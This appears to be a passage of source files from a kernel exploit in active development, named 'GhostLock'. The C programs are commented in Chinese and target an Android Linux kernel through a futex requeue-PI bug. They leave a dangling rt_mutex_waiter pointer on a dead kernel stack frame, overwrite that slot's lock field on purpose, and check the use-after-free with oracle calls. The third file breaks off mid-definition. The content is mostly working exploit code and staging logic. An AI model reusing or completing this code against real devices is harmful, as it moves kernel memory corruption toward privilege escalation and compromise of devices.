`tools/g3b_timeout.c`:

```c
/*
 * g3_free.c — GhostLock G-3a：让栈帧死亡而悬垂指针留存（真正的 UAF 起点）
 *
 * 关键依据（futex.c:2794-2809）：
 *   handle_early_requeue_pi_wakeup() 在 `!match_futex(&q->key, key2)` 时
 *   （即 requeue 失败、q->key 仍指向 A）会 plist_del 并把 ret 置为
 *   -EWOULDBLOCK / -ERESTARTNOINTR，调用者随即 goto out_put_keys 返回，
 *   **不经过 rt_mutex_finish_proxy_lock()，因此也不会调用 remove_waiter()**。
 *
 *   ⇒ 对 A 做一次普通 FUTEX_WAKE，W 返回用户态、内核栈帧弹出，
 *     而 W->pi_blocked_on 仍指向那个已失效的 rt_mutex_waiter。
 *
 * 步骤：
 *   [1] 三锁环触发 -EDEADLK（G-1/G-2c 已验证，稳定命中）
 *   [2] FUTEX_WAKE(A, 1) → W 应带着 -EWOULDBLOCK 返回（栈帧死亡）
 *   [3] oracle：再次 CMP_REQUEUE_PI(A2→C)
 *         -EDEADLK → 指针仍在（已指向失效栈帧 = 真 UAF）
 *         >=0      → 指针已被清除
 *
 * 风险：栈帧已弹出，oracle 的链走查会解引用可能已被复用的栈内存。
 *       按最坏情况处理：每步 fsync、结束即 _exit。
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/syscall.h>
#include <sys/mman.h>

#define LOGPATH "/data/local/tmp/g3.log"

#define FUTEX_WAKE            1
#define FUTEX_LOCK_PI         6
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI  12
#define FUTEX_PRIVATE_FLAG    128

static int logfd = -1;

static double now_ms(void)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return ts.tv_sec * 1000.0 + ts.tv_nsec / 1e6;
}

static void lg(const char *fmt, ...)
{
	char buf[300], line[360];
	va_list ap;
	int n;

	va_start(ap, fmt);
	vsnprintf(buf, sizeof(buf), fmt, ap);
	va_end(ap);
	n = snprintf(line, sizeof(line), "[%8.1fms] %s\n", now_ms(), buf);
	if (write(1, line, n) < 0) { }
	if (logfd >= 0 && write(logfd, line, n) < 0) { }
}

static void sync_log(void)
{
	if (logfd >= 0)
		fsync(logfd);
}

static long futex(uint32_t *uaddr, int op, uint32_t val, void *timeout,
		  uint32_t *uaddr2, uint32_t val3)
{
	return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

struct shared {
	uint32_t A, A2, B, C;
	volatile int b_held, c_held, o_blocked, w_waiting, w_returned;
	volatile int w2_waiting;
	volatile int w_go_next;
	volatile long w_ret;
	volatile int w_errno;
};

static struct shared *S;

static void *thread_w(void *arg)
{
	long r;
	(void)arg;
	r = futex(&S->B, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
	if (r != 0) {
		lg("W: LOCK_PI(B) 失败 errno=%d", errno);
		return NULL;
	}
	S->b_held = 1;
	__sync_synchronize();
	while (!S->o_blocked)
		__asm__ __volatile__("" ::: "memory");
	S->w_waiting = 1;
	__sync_synchronize();
	{
		struct timespec ts;
		clock_gettime(CLOCK_MONOTONIC, &ts);
		ts.tv_nsec += 600L * 1000 * 1000;   /* 600ms 后到期 */
		if (ts.tv_nsec >= 1000000000L) { ts.tv_sec += 1; ts.tv_nsec -= 1000000000L; }
		lg("W: WAIT_REQUEUE_PI(A→C) 带 600ms 超时");
		errno = 0;
		r = futex(&S->A, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0, &ts,
			  &S->C, 0);
	}
	S->w_ret = r;
	S->w_errno = errno;
	S->w_returned = 1;
	__sync_synchronize();
	lg("W: 返回 %ld errno=%d (%s) ← 栈帧此刻起失效",
	   r, S->w_errno, strerror(S->w_errno));

	/* 纯用户态自旋：不发任何 syscall，避免立即复用内核栈覆盖掉那个 waiter */
	while (!S->w_go_next)
		__asm__ __volatile__("" ::: "memory");
	return NULL;
}

static void *thread_o(void *arg)
{
	long r;
	(void)arg;
	r = futex(&S->C, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
	if (r != 0) {
		lg("O: LOCK_PI(C) 失败 errno=%d", errno);
		return NULL;
	}
	S->c_held = 1;
	__sync_synchronize();
	while (!S->b_held)
		__asm__ __volatile__("" ::: "memory");
	S->o_blocked = 1;
	__sync_synchronize();
	lg("O: LOCK_PI(B)（阻塞，形成环）");
	r = futex(&S->B, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
	lg("O: 返回 %ld errno=%d (%s)", r, errno, strerror(errno));
	return NULL;
}

static void *thread_w2(void *arg)
{
	long r;
	(void)arg;
	S->w2_waiting = 1;
	__sync_synchronize();
	lg("W2: WAIT_REQUEUE_PI(A2→C)");
	errno = 0;
	r = futex(&S->A2, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0, NULL,
		  &S->C, 0);
	lg("W2: 返回 %ld errno=%d (%s)", r, errno, strerror(errno));
	return NULL;
}

int main(void)
{
	pthread_t tw, to, tw2;
	long r;
	int e;

	logfd = open(LOGPATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
	lg("===== G-3b start pid=%d =====", getpid());
	sync_log();

	S = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
		 MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (S == MAP_FAILED) {
		lg("mmap FAIL");
		return 1;
	}
	S->A = S->A2 = S->B = S->C = 0;

	/* [1] 触发 */
	pthread_create(&tw, NULL, thread_w, NULL);
	pthread_create(&to, NULL, thread_o, NULL);
	{
		int spin = 0;
		while ((!S->w_waiting || !S->o_blocked) && spin < 3000) {
			usleep(1000);
			spin++;
		}
	}
	usleep(100000);
	errno = 0;
	r = futex(&S->A, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, NULL,
		  &S->C, 0);
	e = errno;
	lg("[1] CMP_REQUEUE_PI(A→C,1) → %ld errno=%d (%s)", r, e, strerror(e));
	sync_log();
	if (!(r == -1 && e == EDEADLK)) {
		lg("[1] 未命中，终止");
		sync_log();
		_exit(2);
	}

	/* [2] 等 600ms 超时到期：走 handle_early_requeue_pi_wakeup 的早退分支，
	 *     W 以 -ETIMEDOUT 返回，且不调用 rt_mutex_finish_proxy_lock/remove_waiter */
	lg("[2] 等待 W 的 600ms 超时到期（早退分支，无 remove_waiter）");
	sync_log();
	{
		int spin = 0;
		while (!S->w_returned && spin < 3000) {
			usleep(1000);
			spin++;
		}
	}
	if (!S->w_returned)
		lg("[2] W 未返回（超时未生效？）");
	else
		lg("[2] W 已返回 ret=%ld errno=%d (%s) ← 栈帧已弹出",
		   S->w_ret, S->w_errno, strerror(S->w_errno));
	sync_log();

	/* [3] oracle */
	pthread_create(&tw2, NULL, thread_w2, NULL);
	{
		int spin = 0;
		while (!S->w2_waiting && spin < 1000) {
			usleep(1000);
			spin++;
		}
	}
	usleep(150000);
	lg("[3] oracle: CMP_REQUEUE_PI(A2→C,1)");
	sync_log();
	errno = 0;
	r = futex(&S->A2, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, NULL,
		  &S->C, 0);
	e = errno;
	lg("[3] 返回 %ld errno=%d (%s)", r, e, strerror(e));
	sync_log();

	lg("---- 判定 ----");
	if (r == -1 && e == EDEADLK)
		lg("verdict: 栈帧已弹出但指针仍在 → **真 UAF**（指向已失效内核栈）");
	else if (r >= 0)
		lg("verdict: 指针已消失（返回 %ld）→ 该出口也会自愈", r);
	else
		lg("verdict: 其他 errno=%d (%s)", e, strerror(e));
	sync_log();
	lg("结束");
	sync_log();
	_exit(0);
}

```

`tools/g3c_steer.c`:

```c
/*
 * g3c_steer.c — GhostLock G-3c / C1：三段式「装悬垂 → 定向换向 → 自验证」
 * 依据：交接文档 §20.5（第十轮，4.9 权威源码）
 *
 * 关键语义（4.9 rtmutex.c，已逐行核对）：
 *   - futex_requeue 把 W 的 q->rt_waiter 交给 rt_mutex_start_proxy_lock(lock, waiter, q->task)
 *     ⇒ task_blocks_on_rt_mutex 的 task/top_task = **被 requeue 的 waiter 的 task（W）**，
 *       不是 requeue 执行线程（main）。
 *   - task_blocks_on_rt_mutex 在走链前写 waiter->lock = lock / waiter->prio = task->prio
 *     （:976-977），并在释放 lock->wait_lock 后才走链（:1022-1024）。
 *   - rt_mutex_adjust_prio_chain 的死锁判据（:642）：
 *         lock == orig_lock  ||  rt_mutex_owner(lock) == top_task
 *     ⇒ 若链条上某把锁的 owner 是 W（= top_task），走查会在到达 W 的槽之前 -EDEADLK。
 *   - remove_waiter（:1076）清的是 current->pi_blocked_on（:1085），不是 waiter->task 的
 *     ⇒ requeue 线程是 main，W 的 pi_blocked_on 被留下（悬垂）。
 *
 * 三阶段：
 *   [A] 步 5：requeue A→C，O 阻塞在 W 持有的 B_ring ⇒ 在 B_ring 处 -EDEADLK（不到 W 的槽）
 *       ⇒ W->pi_blocked_on = &frame1.rt_waiter（lock=C）；W 400ms 超时早退，帧 1 死亡。
 *   [B] W 释放 B_ring 让 O 停放（持有 C），X 阻塞在 C 上（使 C 树非空）；W 立刻重入同一
 *       futex_wait_requeue_pi 路径（frame2，同址）。步 10：requeue A2→C2，O2 阻塞在 W
 *       持有的 B3 ⇒ 在 B3 处 -EDEADLK（仍不到 W 的槽），但 waiter->lock 已被写成 C2。
 *       W 1500ms 超时早退，帧 2 死亡 ⇒ 槽内 lock=C2 且悬垂指针留存。
 *   [C] 步 12：O2 仍阻塞于 B3。requeue A3→C2（被 requeue 的是 W3，top_task=W3≠W）
 *       ⇒ 链条 C2→O2→B3(W)→W→槽(lock=C2) ⇒ lock==orig_lock ⇒ -EDEADLK。
 *       判据：步 12 返回 -EDEADLK = C1 成功；返回 0/1 = 同址假设失败（安全出口）。
 *
 * 安全设计：
 *   - W 在 frame2 返回后只做内存写（设 flag）并纯用户态自旋，不发任何 syscall；
 *   - 每次 fsync 落盘；任何早期判定不符即 _exit；总超时由外部 timeout 控制。
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/syscall.h>
#include <sys/mman.h>

#define LOGPATH "/data/local/tmp/g3c.log"

#define FUTEX_LOCK_PI          6
#define FUTEX_UNLOCK_PI        7
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI  12
#define FUTEX_PRIVATE_FLAG    128

#define T1_MS   400
#define T2_MS  2500
#define T3_MS  5000

static int logfd = -1;

struct shared {
	uint32_t A, A2, A3, B_ring, B3, C, C2;
	volatile int w_holds_ring, w_holds_b3;
	volatile int o_holds_c, o_blocked_ring, o_parked, o_got_ring;
	volatile int x_entered_c;
	volatile int w_waiting_a;
	volatile int w_ret1; volatile int w_err1; volatile int w_returned1;
	volatile int w2_waiting;
	volatile int w2_ret; volatile int w2_err; volatile int w2_returned;
	volatile int o2_holds_c2, o2_blocked_b3;
	volatile int x2_entered_c2;
	volatile int w_unlock_ret;
	volatile int w_tid, o2_tid, o_tid;
	volatile int w3_waiting;
	volatile int go_unlock_b3, w_b3_released, o2_got_b3;
	volatile int go_w3;
	volatile int mode_control;
	volatile int mode_probe, w_probe_ready, w2p_waiting;
	volatile int done;
};

static struct shared *S;

static double now_ms(void)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return ts.tv_sec * 1000.0 + ts.tv_nsec / 1e6;
}

static void lg(const char *fmt, ...)
{
	char buf[400], line[480];
	va_list ap;
	int n;
	va_start(ap, fmt);
	vsnprintf(buf, sizeof(buf), fmt, ap);
	va_end(ap);
	n = snprintf(line, sizeof(line), "[%9.1fms] %s\n", now_ms(), buf);
	if (write(1, line, n) < 0) { }
	if (logfd >= 0 && write(logfd, line, n) < 0) { }
	if (logfd >= 0) fsync(logfd);
}

static long futex(uint32_t *u, int op, uint32_t val, void *to,
		  uint32_t *u2, uint32_t val3)
{
	return syscall(SYS_futex, u, op, val, to, u2, val3);
}

static void abs_timeout(struct timespec *ts, int ms)
{
	clock_gettime(CLOCK_MONOTONIC, ts);
	ts->tv_nsec += (long)ms * 1000000L;
	/* 必须循环归一化：>2000ms 的超时一次减法不够，会产出非法 timespec
	 * ⇒ 内核 timespec_valid() 失败 ⇒ futex 直接返回 -EINVAL（本轮实测踩中） */
	while (ts->tv_nsec >= 1000000000L) {
		ts->tv_sec += 1;
		ts->tv_nsec -= 1000000000L;
	}
}

static int wait_flag(volatile int *p, int ms)
{
	int i, n = ms / 2;
	for (i = 0; i < n; i++) {
		if (*p) return 1;
		usleep(2000);
	}
	return *p;
}

static long lock_pi(uint32_t *u)
{
	return futex(u, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
}

static long unlock_pi(uint32_t *u)
{
	return futex(u, FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
}

/* ---------------------------------------------------------------- W */
static void *thread_w(void *arg)
{
	struct timespec t1, t2;
	long r;

	(void)arg;
	r = lock_pi(&S->B_ring);
	if (r) { lg("W: LOCK_PI(B_ring) 失败 %ld errno=%d", r, errno); return NULL; }
	S->w_tid = (int)syscall(SYS_gettid);
	S->w_holds_ring = 1;
	r = lock_pi(&S->B3);
	if (r) { lg("W: LOCK_PI(B3) 失败 %ld errno=%d", r, errno); return NULL; }
	S->w_holds_b3 = 1;

	/* 两个绝对超时都在 frame1 之前算好：frame1/frame2 之间不调 clock_gettime */
	abs_timeout(&t1, T1_MS);
	abs_timeout(&t2, T2_MS);

	while (!S->o_blocked_ring)
		__asm__ __volatile__("" ::: "memory");
	S->w_waiting_a = 1;
	errno = 0;
	r = futex(&S->A, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0,
		  &t1, &S->C, 0);
	S->w_ret1 = (int)r;
	S->w_err1 = errno;
	S->w_returned1 = 1;

	/* 释放 B_ring，让 O 返回并停放（C 必须保持有主、且 O 不再阻塞） */
	r = unlock_pi(&S->B_ring);
	S->w_unlock_ret = (int)r;

	if (S->mode_probe) {              /* 探针模式：只需 W 释放 B_ring，不进 frame2 */
		S->w_probe_ready = 1;
		while (!S->done)
			__asm__ __volatile__("" ::: "memory");
	}

	/* **立即**重入同一路径：frame2 与 frame1 同址 */
	S->w2_waiting = 1;
	errno = 0;
	r = futex(&S->A2, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0,
		  &t2, &S->C2, 0);
	S->w2_ret = (int)r;
	S->w2_err = errno;
	S->w2_returned = 1;

	/* [12c] 对照模式：允许主线程让 W 释放 B3（此时已不需要保护槽内容） */
	while (!S->go_unlock_b3 && !S->done)
		__asm__ __volatile__("" ::: "memory");
	if (S->go_unlock_b3) {
		(void)unlock_pi(&S->B3);
		S->w_b3_released = 1;
	}

	/* 此后绝不发 syscall（避免复用那块内核栈槽） */
	while (!S->done)
		__asm__ __volatile__("" ::: "memory");
	return NULL;
}

/* ---------------------------------------------------------------- O */
static void *thread_o(void *arg)
{
	long r;
	(void)arg;
	r = lock_pi(&S->C);
	if (r) { lg("O: LOCK_PI(C) 失败 %ld errno=%d", r, errno); return NULL; }
	S->o_tid = (int)syscall(SYS_gettid);
	S->o_holds_c = 1;
	while (!S->w_holds_ring)
		__asm__ __volatile__("" ::: "memory");
	S->o_blocked_ring = 1;
	r = lock_pi(&S->B_ring);          /* 阻塞；W 超时后由 W 释放 */
	if (r) { lg("O: LOCK_PI(B_ring) 失败 %ld errno=%d", r, errno); return NULL; }
	S->o_got_ring = 1;
	S->o_parked = 1;                  /* 持有 C 停放，不再阻塞 */
	while (!S->done)
		__asm__ __volatile__("" ::: "memory");
	return NULL;
}

/* ---------------------------------------------------------------- X */
static void *thread_x(void *arg)
{
	(void)arg;
	while (!S->o_parked)
		__asm__ __volatile__("" ::: "memory");
	S->x_entered_c = 1;
	(void)lock_pi(&S->C);             /* 永久阻塞：使 C 的 waiters 树非空 */
	while (!S->done)
		__asm__ __volatile__("" ::: "memory");
	return NULL;
}

/* --------------------------------------------------------------- O2 */
static void *thread_o2(void *arg)
{
	long r;
	(void)arg;
	while (!S->w_holds_b3)
		__asm__ __volatile__("" ::: "memory");
	r = lock_pi(&S->C2);
	if (r) { lg("O2: LOCK_PI(C2) 失败 %ld errno=%d", r, errno); return NULL; }
	S->o2_tid = (int)syscall(SYS_gettid);
	S->o2_holds_c2 = 1;
	S->o2_blocked_b3 = 1;
	r = lock_pi(&S->B3);              /* 阻塞；owner = W ⇒ step10 在此早退 */
	if (r) { lg("O2: LOCK_PI(B3) 失败 %ld errno=%d", r, errno); return NULL; }
	S->o2_got_b3 = 1;                 /* [12c]：已获 B3 并停放（不再阻塞） */
	while (!S->done)
		__asm__ __volatile__("" ::: "memory");
	return NULL;
}

/* --------------------------------------------------------------- X2 */
static void *thread_x2(void *arg)
{
	(void)arg;
	while (!S->o2_holds_c2)
		__asm__ __volatile__("" ::: "memory");
	S->x2_entered_c2 = 1;
	(void)lock_pi(&S->C2);            /* 使 C2 的 waiters 树非空（阴性对照兜底） */
	while (!S->done)
		__asm__ __volatile__("" ::: "memory");
	return NULL;
}

/* ------------------------------------------------- 探针 waiter W2（A2→C） */
static void *thread_w2p(void *arg)
{
	struct timespec t;
	long r;
	(void)arg;
	abs_timeout(&t, 3000);
	S->w2p_waiting = 1;
	errno = 0;
	r = futex(&S->A2, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0, &t, &S->C, 0);
	lg("W2p: WAIT_REQUEUE_PI(A2→C) 返回 %ld errno=%d", r, errno);
	return NULL;
}

/* --------------------------------------------------------------- W3 */
static void *thread_w3(void *arg)
{
	struct timespec t3;
	long r;
	(void)arg;
	while (!S->go_w3)
		__asm__ __volatile__("" ::: "memory");
	abs_timeout(&t3, T3_MS);
	S->w3_waiting = 1;
	errno = 0;
	r = futex(&S->A3, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0,
		  &t3, &S->C2, 0);
	lg("W3: WAIT_REQUEUE_PI(A3→C2) 返回 %ld errno=%d", r, errno);
	return NULL;
}

/* --------------------------------------------------------------- main */
int main(int argc, char **argv)
{
	pthread_t tw, to, tx, to2, tx2, tw3;
	int control = (argc > 1 && argv[1][0] == 'c');
	int probe   = (argc > 1 && argv[1][0] == 'p');
	long r;
	int e, verdict = 0;

	logfd = open(LOGPATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
	lg("===== G3C-STEER start pid=%d mode=%s =====", getpid(), probe ? "probe" : (control ? "12c-control" : "full"));
	S = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
		 MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (S == MAP_FAILED) { lg("mmap FAIL"); return 1; }
	memset(S, 0, 4096);
	S->mode_control = control;
	S->mode_probe = probe;

	/* --- [A] 装悬垂 --- */
	pthread_create(&tw, NULL, thread_w, NULL);
	pthread_create(&to, NULL, thread_o, NULL);
	pthread_create(&to2, NULL, thread_o2, NULL);
	pthread_create(&tx, NULL, thread_x, NULL);
	pthread_create(&tx2, NULL, thread_x2, NULL);

	if (!wait_flag(&S->w_holds_ring, 3000) ||
	    !wait_flag(&S->w_holds_b3, 3000) ||
	    !wait_flag(&S->o_blocked_ring, 3000) ||
	    !wait_flag(&S->o2_blocked_b3, 3000) ||
	    !wait_flag(&S->w_waiting_a, 3000)) {
		lg("早期握手失败，终止");
		S->done = 1; _exit(2);
	}
	usleep(100000);

	lg("[5] CMP_REQUEUE_PI(A→C,1)  (top_task=W, owner(B_ring)=W ⇒ 应在 B_ring 早退)");
	errno = 0;
	r = futex(&S->A, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, NULL, &S->C, 0);
	e = errno;
	lg("[5] → %ld errno=%d (%s)", r, e, strerror(e));
	if (!(r == -1 && e == EDEADLK)) { lg("[5] 未命中，终止"); S->done = 1; _exit(3); }

	if (!wait_flag(&S->w_returned1, 4000)) {
		lg("[6] W 未从 frame1 返回，终止"); S->done = 1; _exit(4);
	}
	lg("[6] W frame1 返回 %d errno=%d (%s) → 悬垂指针 lock=C，帧 1 已死",
	   S->w_ret1, S->w_err1, strerror(S->w_err1));
	lg("[6] W 中间 UNLOCK_PI(B_ring) 返回 %d", S->w_unlock_ret);

	/* --- [P] 探针模式：验证 [5] 的 -EDEADLK 是否释放了 C 的 pi_state --- */
	if (S->mode_probe) {
		pthread_t tw2p;
		lg("[P] 探针模式：让 W 释放 B_ring ⇒ O 停放 ⇒ 链条在 O 终止");
		if (!wait_flag(&S->w_probe_ready, 3000)) {
			lg("[P] W 未释放 B_ring，终止"); S->done = 1; _exit(20);
		}
		if (!wait_flag(&S->o_parked, 3000)) {
			lg("[P] O 未停放，终止"); S->done = 1; _exit(21);
		}
		usleep(100000);
		if (pthread_create(&tw2p, NULL, thread_w2p, NULL) != 0) {
			lg("[P] W2p 创建失败"); S->done = 1; _exit(22);
		}
		if (!wait_flag(&S->w2p_waiting, 3000)) {
			lg("[P] W2p 未进入等待，终止"); S->done = 1; _exit(23);
		}
		usleep(100000);
		errno = 0;
		r = futex(&S->A2, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, NULL, &S->C, 0);
		e = errno;
		lg("[P] 空链条 CMP_REQUEUE_PI(A2→C) → %ld errno=%d (%s)", r, e, strerror(e));
		lg(r == 1 ? "[P] verdict: **返回 1 ⇒ 内核侧 owner(C)==NULL ⇒ [5] 的 -EDEADLK 释放了 C 的 pi_state**（根因确认）"
			  : (r == 0 ? "[P] verdict: 返回 0 ⇒ owner(C) 仍为 O ⇒ pi_state 未被释放（根因不成立）"
				    : "[P] verdict: 其他结果"));
		S->done = 1;
		_exit(0);
	}

	/* --- [B] 定向换向 --- */
	if (!wait_flag(&S->o_parked, 3000) ||
	    !wait_flag(&S->x_entered_c, 3000) ||
	    !wait_flag(&S->w2_waiting, 4000) ||
	    !wait_flag(&S->x2_entered_c2, 3000)) {
		lg("[7-9] 握手失败，终止"); S->done = 1; _exit(5);
	}
	usleep(100000);

	{
		long pw;
		errno = 0;
		pw = futex(&S->A2, 1 /* FUTEX_WAKE */ | FUTEX_PRIVATE_FLAG, 1, NULL, NULL, 0);
		if (pw == 0) {
			lg("[10p] A2 上无 requeue_pi waiter（唤醒成功）→ 中止，避免误判");
			S->done = 1; _exit(10);
		}
		lg("[10p] 探测 FUTEX_WAKE(A2,1) → %ld errno=%d (%s)  (EINVAL=确有 requeue_pi waiter)",
		   pw, errno, strerror(errno));
		lg("[10p] 字值: A2=%u A=%u C=%u C2=%u | W.tid=%d O.tid=%d O2.tid=%d",
		   S->A2, S->A, S->C, S->C2, S->w_tid, S->o_tid, S->o2_tid);
	}
	lg("[10] CMP_REQUEUE_PI(A2→C2,1)  (owner(B3)=W ⇒ 应在 B3 早退；同时写 waiter->lock=C2)");
	errno = 0;
	r = futex(&S->A2, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, NULL, &S->C2, 0);
	e = errno;
	lg("[10] → %ld errno=%d (%s)", r, e, strerror(e));
	if (!(r == -1 && e == EDEADLK)) {
		if (wait_flag(&S->w2_returned, 2000))
			lg("[10x] W frame2 已提前返回 %d errno=%d (%s) ← 说明它没排到 A2 的链上",
			   S->w2_ret, S->w2_err, strerror(S->w2_err));
		else
			lg("[10x] W frame2 仍在等待（未返回）← 说明 requeue 未找到 waiter，需查 key/桶");
		lg("[10] 未命中，终止");
		S->done = 1; _exit(6);
	}

	if (!wait_flag(&S->w2_returned, 5000)) {
		lg("[10b] W 未从 frame2 返回，终止"); S->done = 1; _exit(7);
	}
	lg("[10b] W frame2 返回 %d errno=%d (%s) → 槽内 lock=C2，帧 2 已死",
	   S->w2_ret, S->w2_err, strerror(S->w2_err));

	/* --- [B2] 诊断：不做任何槽解引用，只测 C2 的 requeue 机制是否仍健康 --- */
	lg("[11d] 字值: A=%u A2=%u A3=%u C=%u C2=%u B3=%u Bring=%u | W=%d O=%d O2=%d",
	   S->A, S->A2, S->A3, S->C, S->C2, S->B3, S->B_ring,
	   S->w_tid, S->o_tid, S->o2_tid);
	{
		long dr;
		errno = 0;
		dr = futex(&S->A2, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, NULL, &S->C2, 0);
		lg("[11e] 空队列 CMP_REQUEUE_PI(A2→C2) → %ld errno=%d (%s)  (期望 0：C2 机制健康)",
		   dr, errno, strerror(errno));
		if (dr != 0) { lg("[11e] C2 requeue 机制异常，终止（不解引用槽）"); S->done = 1; _exit(11); }
	}

	/* --- [C] 自验证（或 [12c] 对照模式：切断 C2→O2→B3 链条，不走查、不解引用槽） --- */
	if (S->mode_control) {
		lg("[12c] 对照模式：让 W 释放 B3 ⇒ O2 获锁停放 ⇒ 链条在 O2 终止（无走查）");
		S->go_unlock_b3 = 1;
		if (!wait_flag(&S->w_b3_released, 3000) || !wait_flag(&S->o2_got_b3, 3000)) {
			lg("[12c] W 释放 B3 / O2 获锁 未完成，终止");
			S->done = 1; _exit(12);
		}
		usleep(100000);
		if (pthread_create(&tw3, NULL, thread_w3, NULL) != 0) {
			lg("[12c] W3 线程创建失败"); S->done = 1; _exit(13);
		}
		S->go_w3 = 1;
		if (!wait_flag(&S->w3_waiting, 3000)) {
			lg("[12c] W3 未进入等待，终止"); S->done = 1; _exit(14);
		}
		usleep(100000);
		errno = 0;
		r = futex(&S->A3, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, NULL, &S->C2, 0);
		e = errno;
		lg("[12c] CMP_REQUEUE_PI(A3→C2) → %ld errno=%d (%s)", r, e, strerror(e));
		lg(r >= 0 ? "[12c] verdict: **对照通过** —— 带真实 waiter 的 C2 requeue 不崩 ⇒ 崩溃只与"
			   "『解引用悬垂槽』相关（H1c 排除）"
			 : "[12c] verdict: 对照失败（H1c 可能成立）");
		S->done = 1;
		_exit(0);
	}
	if (pthread_create(&tw3, NULL, thread_w3, NULL) != 0) {
		lg("[12] W3 线程创建失败，终止"); S->done = 1; _exit(9);
	}
	S->go_w3 = 1;
	if (!wait_flag(&S->w3_waiting, 3000)) {
		lg("[12] W3 未进入等待，终止"); S->done = 1; _exit(8);
	}
	usleep(100000);
	lg("[12] CMP_REQUEUE_PI(A3→C2,1)  (top_task=W3≠W ⇒ 走查应抵达 W 的槽)");
	errno = 0;
	r = futex(&S->A3, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, NULL, &S->C2, 0);
	e = errno;
	lg("[12] → %ld errno=%d (%s)", r, e, strerror(e));

	if (r == -1 && e == EDEADLK) {
		lg("verdict: **C1 成功** —— 槽内 lock 已换向为 C2；同路径重入同址 + 定向改写均证实");
		verdict = 1;
	} else if (r >= 0) {
		lg("verdict: 对齐失败（槽内仍是 C 或未改写）—— 设备无损，需调整扫描窗口");
		verdict = 2;
	} else {
		lg("verdict: 其他 errno=%d (%s)", e, strerror(e));
		verdict = 3;
	}
	lg("---- 设备健康检查应由外部脚本执行（uptime/loadavg） ----");
	lg("结束 verdict=%d", verdict);
	S->done = 1;
	_exit(0);
}

```

`tools/g3c_v6.c`:

```c
/*
 * g3c_v6.c — GhostLock G-3c/C1「亚毫秒窗口」版（交接文档 §21.28）
 *
 * 与 v5 的唯一差别是时序，构造本身完全不变：
 *   v5 在 [10b] 之后才创建 W3 并 usleep(100000) ⇒ 帧死亡→走查间隔 114 ms ⇒ 悬垂槽被破坏 ⇒ panic。
 *   v6 把 W3 预置到 [10] 之前，删掉所有 sleep，帧死亡用无 syscall 忙轮询检测，
 *   走查前只做一次不 fsync 的 write() ⇒ 间隔 < 0.2 ms。
 *
 * 硬约束（不可违反）：
 *   - W 在 frame2 返回后**不得再发任何 syscall**（含 clock_gettime、sched_yield、unlock）。
 *     arm64 的 IRQ/异常入口使用当前任务内核栈，任何一次进内核都可能压坏那块已死的 syscall 帧。
 *   - main 负责所有时间测量与日志。
 *
 * 判据（§21.28.3，运行前已登记）：
 *   [12] == -EDEADLK      ⇒ 同路径重入同址 + [10] 定向写入 + 帧死后仍被解引用（C1 成立）
 *   [12] == 0 / 1         ⇒ 对齐失败（安全出口），C 与 O 整体弃用
 *   不返回 / 重启          ⇒ 推翻 IRQ 压栈推断，回到 §21.11 模型，停止同类实验
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/syscall.h>
#include <sys/mman.h>

#define LOGPATH "/data/local/tmp/g3c6.log"

#define FUTEX_WAKE            1
#define FUTEX_LOCK_PI          6
#define FUTEX_UNLOCK_PI        7
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI  12
#define FUTEX_PRIVATE_FLAG   128

#define T1_MS   400
#define T2_MS  2500
#define T3_MS  8000

static int logfd = -1;

struct shared {
	uint32_t A, A2, A3, B_ring, B3, C, C2;
	volatile int w_holds_ring, w_holds_b3;
	volatile int o_holds_c, o_blocked_ring, o_parked;
	volatile int x_entered_c;
	volatile int w_waiting_a;
	volatile int w_ret1, w_err1, w_returned1;
	volatile int w2_waiting, w2_ret, w2_err, w2_returned;
	volatile int o2_holds_c2, o2_blocked_b3;
	volatile int x2_entered_c2;
